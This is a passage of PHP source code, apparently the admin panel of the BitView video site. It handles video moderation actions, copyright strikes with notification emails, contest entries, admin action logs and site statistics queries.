                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Purged video '.$_VIDEO->Info["url"]]);
		notification("Video has been purged successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
            } elseif (isset($_POST["restore_video"]) && $_VIDEO->Info["status"] == 2 && $_VIDEO->restore()) {
                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Restored video '.$_VIDEO->Info["url"]]);
		notification("Video has been restored successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
            }

            if (isset($_POST["change_thumbnail"]) && $_VIDEO->Info["status"] == 2) {
                $Video = new ffmpeg();
                $Video->Location = $_SERVER['DOCUMENT_ROOT']."/videos/".$_VIDEO->Info["file_url"].".mp4";

                if ($_VIDEO->Info["length"] > 5) {
                    $Second = mt_rand(0,$_VIDEO->Info["length"]);
                } else {
                    $Second = 0;
                }

                unlink($_SERVER['DOCUMENT_ROOT']."/u/thmp/".$_VIDEO->Info["url"].".jpg");
                $Video->Thumbnail($Second,$_VIDEO->Info["url"]);

                header("location: /admin_panel/?page=videos&ve=".$_VIDEO->Info["url"]); exit();
            }

            if (isset($_POST["feature"]) && $_VIDEO->Info["status"] == 2) {
                if ($_VIDEO->Info["featured"] == 0) {
                    $DB->modify("UPDATE videos SET featured = 1 WHERE url = :URL",
                                [":URL" => $_VIDEO->Info["url"]]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Modified video '.$_VIDEO->Info["url"]]);
                    notification("Video has been featured successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
                } else {
                    $DB->modify("UPDATE videos SET featured = 0 WHERE url = :URL",
                                [":URL" => $_VIDEO->Info["url"]]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Modified video '.$_VIDEO->Info["url"]]);
                    notification("Video has been unfeatured successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
                }
            }

            if (isset($_POST["age_restrict"]) && $_VIDEO->Info["status"] == 2) {
                if ($_VIDEO->Info["age_restricted"] == 0) {
                    $DB->modify("UPDATE videos SET age_restricted = 1 WHERE url = :URL",
                                [":URL" => $_VIDEO->Info["url"]]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Modified video '.$_VIDEO->Info["url"]]);
                    notification("Video has been age-restricted successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
                } else {
                    $DB->modify("UPDATE videos SET age_restricted = 0 WHERE url = :URL",
                                [":URL" => $_VIDEO->Info["url"]]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Modified video '.$_VIDEO->Info["url"]]);
                    notification("Video has been updated successfully!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
                }
            }

            if (isset($_POST["strike_user"])) {
                $Uploader = $_VIDEO->Info["uploaded_by"];
                $_OWNER = new User($Uploader,$DB);
                $_OWNER->get_info();

                $DB->modify("INSERT INTO copyright_strikes(url,for_user,submit_date,title) VALUES (:URL,:MEMBER,NOW(),:TITLE)",[":URL" => $_VIDEO->URL, ":MEMBER" => $Uploader, ":TITLE" => $_VIDEO->Info["title"]]);
                $_VIDEO->delete();
                $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Striked '. $Uploader.'']);
                $Emailer = new Email();
                $Emailer->To      = $_OWNER->Info["email"];
                $Emailer->To_Name = $Uploader;
                $Emailer->Subject = $Uploader." - Video removed - Copyright Infringement";
                $Emailer->send_email("We have disabled the following material as a result of a third-party notification from The BitView Staff claiming that this material is infringing:<br><br><strong>".$_VIDEO->Info['title']."</strong><br><a href='https://www.bitview.net/watch?v=".$_VIDEO->Info['url']."'>http://www.bitview.net/watch?v=".$_VIDEO->Info['url']."</a><br><br><strong>Please Note:</strong> Repeat incidents of copyright infringement will result in the deletion of your account and all videos uploaded to that account. In order to prevent this from happening, please delete any videos to which you do not own the rights, and refrain from uploading additional videos that infringe on the copyrights of others.<br><br>Sincerely,<br><br>&#x2014; The BitView Staff");
                notification("Video has been deleted and uploader has been striked for copyright!","/admin_panel/?page=videos","cfeeb2"); exit();
            }

            if (isset($_POST["save_video"])) {
                $_GUMP->validation_rules([
                    "title"         => "required|max_len,100",
                    "description"   => "max_len,2048",
                    "tags"          => "max_len,128",
                    "category"      => "required"
                ]);

                $_GUMP->filter_rules([
                    "title"         => "trim|NoHTML",
                    "description"   => "trim|NoHTML",
                    "tags"          => "trim|NoHTML",
                    "category"      => "trim"
                ]);

                $Validation     = $_GUMP->run($_POST);

                if ($Validation) {
                    if (!isset($_CONFIG::$Categories[$Validation["category"]])) { $Validation["category"] = 1; }

                    $_VIDEO->change_info([
                        "title"       => $Validation["title"],
                        "description" => $Validation["description"],
                        "tags"        => $Validation["tags"],
                        "privacy"     => $Validation["privacy"],
                        "views"       => $Validation["views"],
                        "category"    => $Validation["category"]
                    ]);

                    if ($Validation["1star"] < 0) { $Validation["1star"] = 0; }
                    if ($Validation["2star"] < 0) { $Validation["2star"] = 0; }
                    if ($Validation["3star"] < 0) { $Validation["3star"] = 0; }
                    if ($Validation["4star"] < 0) { $Validation["4star"] = 0; }
                    if ($Validation["5star"] < 0) { $Validation["5star"] = 0; }

                    $DB->modify("UPDATE videos SET 1stars = :1stars, 2stars = :2stars, 3stars = :3stars, 4stars = :4stars, 5stars = :5stars WHERE url = :URL",
                                 [
                                     ":1stars" => $Validation["1star"],
                                     ":2stars" => $Validation["2star"],
                                     ":3stars" => $Validation["3star"],
                                     ":4stars" => $Validation["4star"],
                                     ":5stars" => $Validation["5star"],
                                     ":URL"    => $_VIDEO->URL
                                 ]);
                    $DB->modify("INSERT INTO admin_logs(whodid,whatdid) VALUES (:USERNAME,:WHATDID)",[":USERNAME" => $_USER->Username, ":WHATDID" => 'Modified video '.$_VIDEO->URL]);
                    notification("Video successfully updated!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"],"cfeeb2"); exit();
                } else {
                    notification("Something went wrong!","/admin_panel/?page=videos&ve=".$_VIDEO->Info["url"]); exit();

                }
            }
        } else {
            header("location: /admin_panel/?page=videos"); exit();
        }
    }


    //RECENT VIDEOS
    $Recent_Videos = $DB->execute("SELECT * FROM videos ORDER BY uploaded_on DESC LIMIT 64");

} elseif ($_GET["page"] == "contest") {
    $PAGE = "admin_contest";
    $Latest_Contest = $DB->execute("SELECT * FROM contest ORDER BY id DESC LIMIT 5");

    if (isset($_POST["contest_submit"])) {
        $_GUMP->validation_rules([
            "datemonth"    => "required|max_len,20",
            "whatisthis"  => "required|max_len,200",
            "howtoenter"  => "required|max_len,200",
            "thismonth"  => "required|max_len,200",
            "lastcontestwinners"  => "required|max_len,600",
            "tag"  => "required|max_len,20"
        ]);

        $_GUMP->filter_rules([
            "datemonth"    => "trim",
            "whatisthis"  => "trim",
            "howtoenter"  => "trim",
            "thismonth"   => "trim",
            "lastcontestwinners"   => "trim",
            "tag" => "trim"
        ]);

        $Validation     = $_GUMP->run($_POST);

        if ($Validation) {
            $DB->modify("INSERT INTO contest(datemonth,whatisthis,howtoenter,thismonth,lastcontestwinners,tag) VALUES (:DATEMONTH,:WHATISTHIS,:HOWTOENTER,:THISMONTH,:LASTWINNERS,:TAG)",
                [":DATEMONTH" => $Validation["datemonth"], ":WHATISTHIS" => $Validation["whatisthis"], ":HOWTOENTER" => $Validation["howtoenter"], ":THISMONTH" => $Validation["thismonth"], ":LASTWINNERS" => $Validation["lastcontestwinners"], ":TAG" => $Validation["tag"]]);
            notification("Added new month contest!","/admin_panel/?page=contest","cfeeb2"); exit();
        }
    }

}

elseif ($_GET["page"] == "log") {
    if ($_USER->Is_Admin) {
        $PAGE = "admin_log";
        $_PAGINATION = new Pagination(64, 100);
        if (!isset($_GET['fu'])) {
            $_PAGINATION->total($DB->execute("SELECT count(*) as num FROM admin_logs",true)["num"]);
            $Logs = $DB->execute("SELECT * FROM admin_logs ORDER BY id DESC LIMIT $_PAGINATION->From, $_PAGINATION->To");
        }
        elseif ($_GET['fu']) {
            $fu = $_GET['fu'];
            $_PAGINATION->total($DB->execute("SELECT count(*) as num FROM admin_logs WHERE whodid = ?",true,[$fu])["num"]);
            $Logs = $DB->execute("SELECT * FROM admin_logs WHERE whodid = ? ORDER BY id DESC LIMIT $_PAGINATION->From, $_PAGINATION->To",false,[$fu]);
        }
        $TotalPages = $_PAGINATION->Total_Pages;
        $WhoDid = $DB->execute("SELECT whodid FROM admin_logs GROUP BY whodid");
    }
    else {
        header("location: /admin_panel/");
    }
}

elseif ($_GET["page"] == "stats") {
    $PAGE = "admin_stats";
    $Views_Stats = $DB->execute("SELECT SUM(views) as views, submit_date FROM views_day GROUP BY DATE(submit_date)");
    $Users_Stats = $DB->execute("SELECT count(username) as amount, registration_date FROM users WHERE is_banned=0 GROUP BY DATE(registration_date)");
    if (isset($_GET['view_u']) && $_GET['view_u'] == "e") {
        for ($i = 1; $i <= $DB->Row_Num - 1; $i++) {
                    $n = $i - 1;
                    $Users_Stats[$i]['amount'] += $Users_Stats[$n]['amount'];
        }
    }

    //VIDEO STATS
    $Stats = $DB->execute("SELECT count(url) as all_videos, sum(views) as all_views, sum(favorites) as all_favorites, sum(comments) as all_comments FROM videos",true);

    //FRIENDS
    $Friends = $DB->execute("SELECT SUM(friends) as amount FROM users",true)["amount"];

    //FRIENDS
    $Channel_Comments = $DB->execute("SELECT COUNT(*) as amount FROM channel_comments",true)["amount"];

    //SUBSCRIPTIONS
    $Subscriptions = $DB->execute("SELECT SUM(subscriptions) as amount FROM users",true)["amount"];

    //RATINGS
    $Ratings       = $DB->execute("SELECT count(rating) as amount FROM videos_ratings",true)["amount"];

    //BULLETINS
    $Bulletins     = $DB->execute("SELECT count(id) as amount FROM bulletins",true)["amount"];
    $Bulletins_2     = $DB->execute("SELECT count(id) as amount FROM bulletins_new",true)["amount"];

    //COMMENT VOTES
    $Comment_Votes     = $DB->execute("SELECT count(id) as amount FROM comment_votes",true)["amount"];

    //USER STATS
    $Stats2 = $DB->execute("SELECT count(username) as all_users FROM users",true);

    //BANNED USER STATS
    $Stats3 = $DB->execute("SELECT count(username) as banned_users FROM users WHERE is_banned = 1",true);

    //GROUPS
    $Groups = $DB->execute("SELECT count(id) as amount FROM groups",true)['amount'];

    //PLAYLISTS
    $Playlists = $DB->execute("SELECT count(id) as amount FROM playlists",true)['amount'];

    //RESPONSES
    $Responses = $DB->execute("SELECT count(id) as amount FROM videos_responses",true)['amount'];

    //SEARCHES
    $Searches = $DB->execute("SELECT count(*) as amount FROM search",true)['amount'];

    //MESSAGES
    $Messages = $DB->execute("SELECT count(*) as amount FROM users_messages",true)['amount'];

    //LINKS
    $Links = $DB->execute("SELECT count(*) as amount FROM videos_links",true)['amount'];

    //AVERAGE VIEWS
    $AvgViews = $DB->execute("SELECT round(avg(views)) as amount FROM videos",true)['amount'];
}
require("../a/simple-php-captcha.php");
$_SESSION['captcha'] = simple_php_captcha();



$_PAGE = [
    "Page"          => $PAGE,
    "Page_Type"     => "admin_panel",
    "Page_Title"    => "About Us"
];

require "pages/main.php";
